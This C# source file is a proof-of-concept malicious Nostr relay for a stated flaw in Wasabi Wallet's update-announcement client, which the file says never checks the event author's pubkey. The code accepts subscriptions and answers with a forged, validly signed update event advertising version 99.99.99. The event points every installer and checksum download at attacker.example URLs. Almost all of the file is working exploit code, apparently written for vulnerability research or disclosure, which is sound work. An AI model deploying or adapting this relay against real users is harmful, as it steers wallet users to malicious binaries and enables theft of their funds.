using System.Net;
using System.Net.WebSockets;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using NBitcoin.Secp256k1;

// Malicious Nostr relay for the Wasabi update-announcement forgery PoC.
// It speaks just enough NIP-01 for NNostr.Client, then replies with a
// VALIDLY SIGNED event that is NOT from the Wasabi team key, carrying
// attacker download URLs. Wasabi's WasabiNostrClient accepts it because it
// never compares the event's pubkey against the author it subscribed to.

class FakeRelay
{
    // Attacker-controlled keypair (NOT the Wasabi team key).
    static readonly ECPrivKey AttackerKey = ECPrivKey.Create(Convert.FromHexString(
        "0101010101010101010101010101010101010101010101010101010101010101"));
    static readonly string AttackerPubHex = Convert.ToHexString(AttackerKey.CreateXOnlyPubKey().ToBytes()).ToLowerInvariant();

    static async Task Main()
    {
        var listener = new HttpListener();
        listener.Prefixes.Add("http://127.0.0.1:7777/");
        listener.Start();
        Console.WriteLine($"[RELAY] listening on ws://127.0.0.1:7777  attacker pubkey = {AttackerPubHex}");

        while (true)
        {
            var ctx = await listener.GetContextAsync();
            if (!ctx.Request.IsWebSocketRequest) { ctx.Response.StatusCode = 400; ctx.Response.Close(); continue; }
            var wsCtx = await ctx.AcceptWebSocketAsync(null);
            _ = Task.Run(() => Handle(wsCtx.WebSocket));
        }
    }

    static async Task Handle(WebSocket ws)
    {
        var buf = new byte[64 * 1024];
        while (ws.State == WebSocketState.Open)
        {
            var res = await ws.ReceiveAsync(buf, CancellationToken.None);
            if (res.MessageType == WebSocketMessageType.Close)
            {
                await ws.CloseAsync(WebSocketCloseStatus.NormalClosure, null, CancellationToken.None);
                return;
            }
            var txt = Encoding.UTF8.GetString(buf, 0, res.Count);
            if (txt.Contains("\"REQ\""))
            {
                Console.WriteLine("[RELAY] REQ: " + txt);
                var doc = JsonDocument.Parse(txt);
                var subId = doc.RootElement[1].GetString()!;
                var filterAuthor = doc.RootElement[2].GetProperty("authors")[0].GetString()!;
                Console.WriteLine($"[RELAY] client asked for author = {filterAuthor} (the Wasabi team npub)");
                Console.WriteLine($"[RELAY] replying with event signed by ATTACKER key {AttackerPubHex} instead");

                var ev = BuildForgedEvent();
                var frame = "[\"EVENT\"," + JsonSerializer.Serialize(subId) + "," + ev + "]";
                await ws.SendAsync(Encoding.UTF8.GetBytes(frame), WebSocketMessageType.Text, true, CancellationToken.None);
                Console.WriteLine("[RELAY] forged EVENT sent.");
            }
            else if (txt.Contains("\"CLOSE\"")) return;
        }
    }

    static string BuildForgedEvent()
    {
        var tags = new object[][]
        {
            new object[]{ "version", "99.99.99" },
            new object[]{ "SHA256SUMS", "http://attacker.example/wasabi/SHA256SUMS" },
            new object[]{ "SHA256SUMS.asc", "http://attacker.example/wasabi/SHA256SUMS.asc" },
            new object[]{ "SHA256SUMS.wasabisig", "http://attacker.example/wasabi/SHA256SUMS.wasabisig" },
            new object[]{ "Wasabi-99.99.99-linux-x64.tar.gz", "http://attacker.example/wasabi/Wasabi-99.99.99-linux-x64.tar.gz" },
            new object[]{ "Wasabi-99.99.99-linux-arm64.tar.gz", "http://attacker.example/wasabi/Wasabi-99.99.99-linux-arm64.tar.gz" },
            new object[]{ "Wasabi-99.99.99.msi", "http://attacker.example/wasabi/Wasabi-99.99.99.msi" },
            new object[]{ "Wasabi-99.99.99.dmg", "http://attacker.example/wasabi/Wasabi-99.99.99.dmg" },
            new object[]{ "Wasabi-99.99.99-arm64.dmg", "http://attacker.example/wasabi/Wasabi-99.99.99-arm64.dmg" },
        };
        var createdAt = DateTimeOffset.UtcNow.ToUnixTimeSeconds();
        var content = "Wasabi Wallet v99.99.99 security update available";

        // NIP-01 id preimage: [0, pubkey, created_at, kind, tags, content]
        var preimage = JsonSerializer.Serialize(new object[] { 0, AttackerPubHex, createdAt, 1, tags, content });
        var idBytes = System.Security.Cryptography.SHA256.HashData(Encoding.UTF8.GetBytes(preimage));
        var id = Convert.ToHexString(idBytes).ToLowerInvariant();

        // BIP-340 Schnorr sign with attacker key
        var sig = AttackerKey.SignBIP340(idBytes);
        var sigHex = Convert.ToHexString(sig.ToBytes()).ToLowerInvariant();

        return JsonSerializer.Serialize(new
        {
            id,
            pubkey = AttackerPubHex,
            created_at = createdAt,
            kind = 1,
            tags,
            content,
            sig = sigHex
        });
    }
}
